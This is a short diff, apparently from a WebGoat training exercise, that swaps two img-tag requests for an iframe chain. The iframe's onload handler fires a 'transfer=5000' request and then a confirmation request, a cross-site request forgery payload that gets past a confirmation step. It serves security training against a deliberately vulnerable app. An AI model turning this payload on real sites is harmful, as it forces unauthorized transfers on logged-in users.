@@ -1,2 +1,1 @@
-<img src = "http://localhost:8090/WebGoat/attack?Screen=1232167937&menu=900&transfer=5000">
-<img src = "http://localhost:8090/WebGoat/attack?Screen=1232167937&menu=900&transfer=CONFIRM">
+<iframe src="attack?Screen=1232167937&menu=900&transfer=5000" onload="document.getElementById('confirmed').src='attack?Screen=1232167937&menu=900&transfer=CONFIRMED';"></iframe><iframe id="confirmed"></iframe>
